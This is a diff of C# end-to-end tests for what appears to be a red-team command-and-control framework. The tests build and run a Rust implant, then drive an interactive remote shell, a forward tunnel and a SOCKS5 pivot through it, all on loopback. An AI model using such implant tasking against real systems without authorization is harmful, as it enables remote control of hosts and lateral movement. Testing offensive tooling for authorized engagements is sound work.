@@ -1,5 +1,7 @@
 using System.Diagnostics;
+using System.Net;
 using System.Net.Http.Json;
+using System.Net.Sockets;
 using System.Text;
 using Microsoft.AspNetCore.Hosting;
 using Microsoft.Extensions.DependencyInjection;
@@ -245,6 +247,381 @@ public class RustImplantEndToEndTests
             }
             process?.Dispose();
             try { Directory.Delete(outDir, recursive: true); } catch { }
+        }
+    }
+
+    [RustFact]
+    public async Task RustImplant_RunsAnInteractiveShell_OverTheWebSocketBeacon()
+        => await InteractRoundtripAsync("stream");
+
+    [RustFact]
+    public async Task RustImplant_RunsAnInteractiveShell_OverThePollCycle()
+        => await InteractRoundtripAsync("poll");
+
+    [RustFact]
+    public async Task RustImplant_BridgesAThroughTheForwardTunnel()
+    {
+        using var third = EchoHost.Start();
+        await using var implant = await BuildRunAndAwaitOnlineAsync("stream");
+        var env = implant.Env;
+
+        var issued = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks",
+            new TaskEndpoints.IssueTaskRequest(implant.ImplantId, "tunnel.forward", $"127.0.0.1 {third.Port}"));
+        issued.EnsureSuccessStatusCode();
+        var task = await issued.Content.ReadFromJsonAsync<TaskBody>();
+        await WaitForTaskAsync(env, task!.TaskId,
+            body => body.Status is "Dispatched" or "Completed",
+            implant.Stderr, "the tunnel task's dispatch");
+
+        // The relay bind: the tunnel's operator-side socket, so unmodified
+        // tooling rides the channel without per-byte input posts.
+        var bound = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks/{task.TaskId}/relay", new { });
+        bound.EnsureSuccessStatusCode();
+        var relay = await bound.Content.ReadFromJsonAsync<RelayBody>();
+
+        using var tool = new TcpClient();
+        await tool.ConnectAsync(IPAddress.Loopback, relay!.Port);
+        var stream = tool.GetStream();
+        await stream.WriteAsync(Encoding.UTF8.GetBytes("ping-through-the-tunnel"));
+        var buffer = new byte[256];
+        var read = await ReadWithDeadlineAsync(stream, buffer);
+        Assert.Equal("ping-through-the-tunnel", Encoding.UTF8.GetString(buffer, 0, read));
+
+        // eof half-closes the tunnel's implant side; the third host's close
+        // completes the task with the relay summary.
+        var closed = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks/{task.TaskId}/input", new { Eof = true });
+        closed.EnsureSuccessStatusCode();
+        var done = await WaitForTaskAsync(env, task.TaskId,
+            body => body.Status == "Completed", implant.Stderr, "the forward tunnel's completion");
+        Assert.Equal("Succeeded", done.Outcome);
+        Assert.Contains("bytes up", done.Output);
+        Assert.Contains("bytes down", done.Output);
+    }
+
+    [RustFact]
+    public async Task RustImplant_ServesSocksAcrossManyConnections()
+    {
+        using var thirdOne = EchoHost.Start();
+        using var thirdTwo = EchoHost.Start();
+        await using var implant = await BuildRunAndAwaitOnlineAsync("stream");
+        var env = implant.Env;
+
+        // The proxy opens like any other task: no arguments, because every
+        // destination arrives per connection.
+        var issued = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks",
+            new TaskEndpoints.IssueTaskRequest(implant.ImplantId, "tunnel.socks", ""));
+        issued.EnsureSuccessStatusCode();
+        var task = await issued.Content.ReadFromJsonAsync<TaskBody>();
+        await WaitForTaskAsync(env, task!.TaskId,
+            body => body.Status is "Dispatched" or "Completed",
+            implant.Stderr, "the socks task's dispatch");
+
+        var bound = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks/{task.TaskId}/relay", new { });
+        bound.EnsureSuccessStatusCode();
+        var relay = await bound.Content.ReadFromJsonAsync<RelayBody>();
+
+        // Two SOCKS clients to two different third hosts through the one
+        // channel: the multiplexer must keep the connections apart.
+        var one = await SocksConnectAsync(relay!.Port, "127.0.0.1", thirdOne.Port);
+        var two = await SocksConnectAsync(relay.Port, "127.0.0.1", thirdTwo.Port);
+        await one.WriteAsync(Encoding.UTF8.GetBytes("first"));
+        await two.WriteAsync(Encoding.UTF8.GetBytes("second"));
+        var buffer = new byte[256];
+        Assert.Equal("first", Encoding.UTF8.GetString(buffer, 0, await ReadWithDeadlineAsync(one, buffer)));
+        Assert.Equal("second", Encoding.UTF8.GetString(buffer, 0, await ReadWithDeadlineAsync(two, buffer)));
+        one.Dispose();
+        two.Dispose();
+
+        // eof closes the proxy with the task; the summary is the proxy's
+        // record of what it dialed and moved.
+        var closed = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks/{task.TaskId}/input", new { Eof = true });
+        closed.EnsureSuccessStatusCode();
+        var done = await WaitForTaskAsync(env, task.TaskId,
+            body => body.Status == "Completed", implant.Stderr, "the socks proxy's completion");
+        Assert.Equal("Succeeded", done.Outcome);
+        Assert.Contains("2 connections (0 refused)", done.Output);
+    }
+
+    /// The interactive shell through a baked artifact at the named contact
+    /// mode: the task opens the channel with its initial command, the
+    /// transcript goes live before any completion, typed input crosses as
+    /// channel input, and eof closes the shell through an ordinary result.
+    /// Poll mode exercises the degraded discipline end to end -- the
+    /// channels.poll advertisement, server-side parking, and per-cycle
+    /// drain -- while stream mode rides the live sink and the tick flush.
+    private static async Task InteractRoundtripAsync(string mode)
+    {
+        await using var implant = await BuildRunAndAwaitOnlineAsync(mode);
+        var env = implant.Env;
+        var marker = "rod-interact-open-" + Guid.NewGuid().ToString("N")[..8];
+        var typed = "rod-interact-typed-" + Guid.NewGuid().ToString("N")[..8];
+
+        var issued = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks",
+            new TaskEndpoints.IssueTaskRequest(implant.ImplantId, "shell.interact", $"echo {marker}"));
+        issued.EnsureSuccessStatusCode();
+        var task = await issued.Content.ReadFromJsonAsync<TaskBody>();
+
+        await WaitForTaskAsync(env, task!.TaskId,
+            body => body.Output?.Contains(marker) == true,
+            implant.Stderr, "the shell's first output");
+
+        var sent = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks/{task.TaskId}/input",
+            new { Data = Encoding.UTF8.GetBytes($"echo {typed}\n") });
+        sent.EnsureSuccessStatusCode();
+        await WaitForTaskAsync(env, task.TaskId,
+            body => body.Output?.Contains(typed) == true,
+            implant.Stderr, "the typed command's output");
+
+        var closed = await env.Http.PostAsJsonAsync(
+            $"/engagements/{env.EngagementId}/tasks/{task.TaskId}/input", new { Eof = true });
+        closed.EnsureSuccessStatusCode();
+        var done = await WaitForTaskAsync(env, task.TaskId,
+            body => body.Status == "Completed", implant.Stderr, "the shell's completion");
+        Assert.Equal("Succeeded", done.Outcome);
+        Assert.Contains("shell exited", done.Output);
+    }
+
+    /// A built-and-running baked artifact plus its live teamserver: the
+    /// shared harness of the channel legs.
+    private sealed class RunningRust : IAsyncDisposable
+    {
+        public required TestEnv Env { get; init; }
+        public required string ImplantId { get; init; }
+        public required Process Process { get; init; }
+        public required StringBuilder Stderr { get; init; }
+        public required string OutDir { get; init; }
+
+        public async ValueTask DisposeAsync()
+        {
+            if (!Process.HasExited)
+            {
+                try { Process.Kill(entireProcessTree: true); } catch { }
+                Process.WaitForExit(5000);
+            }
+            Process.Dispose();
+            await Env.DisposeAsync();
+            try { Directory.Delete(OutDir, recursive: true); } catch { }
+        }
+    }
+
+    /// Builds the artifact through the operator API at the given contact
+    /// mode, runs it in its fielded shape, and waits for the roster to show
+    /// it online -- the channel legs' shared prefix.
+    private static async Task<RunningRust> BuildRunAndAwaitOnlineAsync(string mode)
+    {
+        var env = await TestEnv.StartAsync();
+        try
+        {
+            await env.CreateEngagementAsync();
+            var enrollUrl = $"http://127.0.0.1:{env.HttpPort}/implants/enroll";
+            var built = await env.Http.PostAsJsonAsync(
+                $"/engagements/{env.EngagementId}/payloads",
+                new PayloadEndpoints.BuildPayloadRequest(
+                    Language: "rust",
+                    Class: "Stage2",
+                    TargetOs: "linux",
+                    TargetArch: "amd64",
+                    Endpoint: enrollUrl,
+                    UriPath: null,
+                    SleepSeconds: 1.0,
+                    JitterSeconds: 0.0,
+                    KillDate: null,
+                    Mode: mode));
+            Assert.True(built.IsSuccessStatusCode, await built.Content.ReadAsStringAsync());
+            var artifact = await built.Content.ReadFromJsonAsync<ArtifactBody>();
+            Assert.NotNull(artifact);
+
+            var outDir = Path.Combine(Path.GetTempPath(), "rod-e2e-rust-" + Guid.NewGuid().ToString("N"));
+            Directory.CreateDirectory(outDir);
+            var binaryPath = Path.Combine(outDir, "rod-implant");
+            using (var download = await env.Http.GetAsync(
+                $"/engagements/{artifact!.EngagementId}/payloads/{artifact.ArtifactId}"))
+            {
+                download.EnsureSuccessStatusCode();
+                await File.WriteAllBytesAsync(binaryPath, await download.Content.ReadAsByteArrayAsync());
+            }
+            if (!OperatingSystem.IsWindows())
+            {
+                File.SetUnixFileMode(binaryPath,
+                    UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
+            }
+
+            var stderr = new StringBuilder();
+            var process = Process.Start(new ProcessStartInfo
+            {
+                FileName = binaryPath,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+            });
+            Assert.NotNull(process);
+            process!.ErrorDataReceived += (_, e) => { if (e.Data is not null) stderr.AppendLine(e.Data); };
+            process.BeginErrorReadLine();
+
+            var implantId = await WaitForOnlineAsync(env, TimeSpan.FromSeconds(90), stderr);
+            return new RunningRust
+            {
+                Env = env,
+                ImplantId = implantId,
+                Process = process,
+                Stderr = stderr,
+                OutDir = outDir,
+            };
+        }
+        catch
+        {
+            await env.DisposeAsync();
+            throw;
+        }
+    }
+
+    private static async Task<TaskBody> WaitForTaskAsync(
+        TestEnv env, string taskId, Func<TaskBody, bool> done, StringBuilder stderr, string awaiting)
+    {
+        var deadline = DateTimeOffset.UtcNow.AddSeconds(90);
+        while (DateTimeOffset.UtcNow < deadline)
+        {
+            var read = await env.Http.GetFromJsonAsync<TaskBody>(
+                $"/engagements/{env.EngagementId}/tasks/{taskId}");
+            if (read is not null && done(read))
+                return read;
+            await Task.Delay(500);
+        }
+        Assert.Fail($"timed out waiting for {awaiting}. Implant stderr:\n{stderr}");
+        throw new InvalidOperationException("unreachable");
+    }
+
+    private sealed record RelayBody
+    {
+        public string TaskId { get; set; } = "";
+        public string Host { get; set; } = "";
+        public int Port { get; set; }
+    }
+
+    /// The third host of the tunnel legs: a loopback listener that echoes
+    /// every byte back until its peer closes.
+    private sealed class EchoHost : IDisposable
+    {
+        private readonly TcpListener _listener;
+
+        private EchoHost(TcpListener listener, int port)
+        {
+            _listener = listener;
+            Port = port;
+        }
+
+        public int Port { get; }
+
+        public static EchoHost Start()
+        {
+            var listener = new TcpListener(IPAddress.Loopback, 0);
+            listener.Start();
+            var host = new EchoHost(listener, ((IPEndPoint)listener.LocalEndpoint).Port);
+            _ = host.ServeAsync();
+            return host;
+        }
+
+        private async Task ServeAsync()
+        {
+            while (true)
+            {
+                TcpClient client;
+                try
+                {
+                    client = await _listener.AcceptTcpClientAsync();
+                }
+                catch (Exception ex) when (ex is SocketException or ObjectDisposedException)
+                {
+                    return;
+                }
+                _ = ServeOneAsync(client);
+            }
+        }
+
+        private static async Task ServeOneAsync(TcpClient client)
+        {
+            using (client)
+            {
+                var buffer = new byte[16 * 1024];
+                var stream = client.GetStream();
+                while (true)
+                {
+                    int read;
+                    try
+                    {
+                        read = await stream.ReadAsync(buffer);
+                    }
+                    catch (Exception ex) when (ex is SocketException or ObjectDisposedException)
+                    {
+                        return;
+                    }
+                    if (read <= 0)
+                        return;
+                    await stream.WriteAsync(buffer.AsMemory(0, read));
+                }
+            }
+        }
+
+        public void Dispose() => _listener.Stop();
+    }
+
+    /// The minimal SOCKS5 client a browser implements: no-auth greeting,
+    /// CONNECT with a domain-shaped address, then a byte stream.
+    private static async Task<NetworkStream> SocksConnectAsync(int proxyPort, string host, int port)
+    {
+        var tool = new TcpClient();
+        await tool.ConnectAsync(IPAddress.Loopback, proxyPort);
+        var stream = tool.GetStream();
+
+        await stream.WriteAsync(new byte[] { 5, 1, 0 });
+        var method = new byte[2];
+        await ReadExactlyAsync(stream, method);
+        Assert.Equal(5, method[0]);
+        Assert.Equal(0, method[1]);
+
+        var name = Encoding.ASCII.GetBytes(host);
+        var request = new List<byte> { 5, 1, 0, 3, (byte)name.Length };
+        request.AddRange(name);
+        request.Add((byte)(port >> 8));
+        request.Add((byte)port);
+        await stream.WriteAsync(request.ToArray());
+
+        var reply = new byte[10];
+        await ReadExactlyAsync(stream, reply);
+        Assert.Equal(0, reply[1]); // the dial's result, through the implant
+        return stream;
+    }
+
+    private static async Task<int> ReadWithDeadlineAsync(NetworkStream stream, byte[] buffer)
+    {
+        using var deadline = new CancellationTokenSource(TimeSpan.FromSeconds(30));
+        try
+        {
+            return await stream.ReadAsync(buffer, deadline.Token);
+        }
+        catch (OperationCanceledException)
+        {
+            throw new TimeoutException("the tunnel did not answer within 30s");
+        }
+    }
+
+    private static async Task ReadExactlyAsync(NetworkStream stream, byte[] buffer)
+    {
+        var offset = 0;
+        while (offset < buffer.Length)
+        {
+            using var deadline = new CancellationTokenSource(TimeSpan.FromSeconds(30));
+            var read = await stream.ReadAsync(buffer.AsMemory(offset), deadline.Token);
+            if (read <= 0)
+                throw new IOException("the peer closed early");
+            offset += read;
         }
     }
 
